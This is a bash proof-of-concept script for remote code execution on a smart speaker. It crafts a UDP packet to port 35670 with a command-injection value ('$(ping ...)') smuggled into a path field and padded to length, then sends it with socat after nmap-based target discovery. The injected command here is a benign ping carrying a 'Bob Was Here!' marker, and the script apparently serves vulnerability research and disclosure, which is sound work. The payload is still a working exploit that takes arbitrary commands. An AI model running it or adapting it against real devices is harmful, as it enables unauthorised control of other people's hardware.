#!/bin/bash
#
#

which socat > /dev/null || { echo "Socat not found - please apt install socat"; exit 1; }
which xxd > /dev/null  || { echo "xxd not found - please apt install xxd (or vim-common) to view payloads"; exit 1; }

echo "If you dont know the IP address, run nmap on your local subnet, e.g. nmap 172.20.10.0/24, and look for something with open TCP ports on 8008, 8009, 8080, 8443, 9000, 10001 and (crucially) UDP 35670 "


test -z "$1" && { echo "First argument should be the IP address of the smart speaker; use nmap to find it"; exit 1; }
SPEAKER_IP="$1"

test -z "$2" && { echo "Second argument should be an IP address to ping, such as your own IP"; exit 1; }

#COMMAND='"$(ping -p 426f6220576173204865726521 '$2' &)"'
COMMAND='"$(ping -c 1 -p 426f6220576173204865726521 '$2' &)"'


echo "RCE COMMAND:"
echo -n $COMMAND | xxd
echo 

echo "UDP PAYLOAD:"
echo -n -e '\x13\00\00\00\00\00\00\00\x94\00\00\00/'${COMMAND}'/\00'$(for x in $(seq 1 $((125 - ${#COMMAND}))) ; do echo -n -e a ; done)'blahbla\00' | xxd
echo

echo "Dont forget to run wireshark or tcpdump..."
echo
echo Press ENTER to continue
read -r dummy


echo "Sending payload to $SPEAKER_IP:35670"
# socat it away!
echo -n -e '\x13\00\00\00\00\00\00\00\x94\00\00\00/'${COMMAND}'/\00'$(for x in $(seq 1 $((125 - ${#COMMAND}))) ; do echo -n -e a ; done)'blahbla\00' | socat - udp4:$SPEAKER_IP:35670

echo "If you dont see a ping, try again, sometimes they dont work if too close together, this seems to be a quirk if the target is Windows."
echo "On the other end there is a few seconds delay before the first system() call returns, after we see the ICMP in wireshark, for some reason."


echo "Done"

